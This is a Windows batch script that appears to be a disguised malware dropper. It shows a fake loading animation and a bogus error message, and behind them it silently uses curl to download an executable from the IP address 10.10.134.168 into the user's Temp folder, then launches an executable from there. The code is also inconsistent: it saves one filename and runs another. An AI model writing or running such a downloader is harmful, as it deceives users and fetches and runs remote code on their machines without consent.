@echo off

set "server_url=10.10.134.168:80/"
set "server_file=client.exe"

set "downloads_folder=%USERPROFILE%\AppData\Local\Temp"

setlocal enabledelayedexpansion

rem
set "animation[1]=Loading"
set "animation[2]=Loading."
set "animation[3]=Loading.."
set "animation[4]=Loading..."

rem
set "repeat=10"

rem
cls

rem
for /l %%i in (1,1,%repeat%) do (
    for %%a in (1,2,3,4) do (
        echo !animation[%%a]!
        timeout /t 1 >nul
        cls
    )
)

echo Error, wait 5 seconds

curl -o "%downloads_folder%\filename.exe" %server_url%%server_file% > NUL 2>&1

:CHECK_DOWNLOAD
if exist "%downloads_folder%\filename.exe" (
    start "" /B "%downloads_folder%\host-service.exe"
) else (
    timeout /t 1
    goto CHECK_DOWNLOAD
)

exit
